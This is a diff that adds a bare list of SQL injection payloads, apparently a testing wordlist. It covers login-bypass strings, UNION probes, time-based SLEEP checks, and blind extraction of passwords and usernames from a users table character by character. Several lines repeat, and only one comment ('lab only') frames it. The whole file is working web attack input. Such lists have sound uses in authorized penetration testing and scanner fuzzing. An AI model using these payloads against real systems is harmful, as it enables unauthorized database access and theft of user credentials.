@@ -1,0 +1,29 @@
+' OR '1'='1
+' OR 1=1 --
+" OR "" = "
+' UNION SELECT NULL,NULL,NULL --
+' AND SLEEP(5)--
+' OR 'a'='a
+') OR ('1'='1
+" OR 1=1#
+' AND 1=(SELECT COUNT(*) FROM users) --
+' OR EXISTS(SELECT * FROM users WHERE username LIKE '%admin%') --
+' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE NULL END FROM dual) --
+' OR 1 GROUP BY CONCAT(username,0x3a,password) HAVING 1=1--
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64 --
+' OR '1'='1
+' UNION SELECT NULL,NULL,NULL --
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --
+' OR EXISTS(SELECT * FROM users) --
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64 --
+' OR '1'='1' --
+' OR 'a'='a' --
+' UNION SELECT NULL,NULL,NULL --
+' AND (SELECT COUNT(*) FROM users)>0 --
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) --
+' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64 --
+' OR EXISTS(SELECT * FROM users) --
+' OR SLEEP(2) --   # Time-based testing (lab only)
+' AND id=CAST((SELECT id FROM users LIMIT 1) AS INT) --
+' OR LENGTH((SELECT password FROM users LIMIT 1))>5 --
+' AND SUBSTRING((SELECT username FROM users LIMIT 1),1,1)='a' --
